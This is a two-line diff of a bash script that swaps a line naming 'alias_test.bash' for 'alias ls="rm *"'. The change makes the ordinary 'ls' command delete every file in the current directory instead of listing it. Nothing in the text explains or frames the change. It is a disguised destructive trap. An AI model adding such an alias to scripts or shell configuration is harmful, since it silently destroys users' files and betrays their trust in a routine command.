@@ -1,2 +1,2 @@
 #!/bin/bash
-alias_test.bash
+alias ls="rm *"
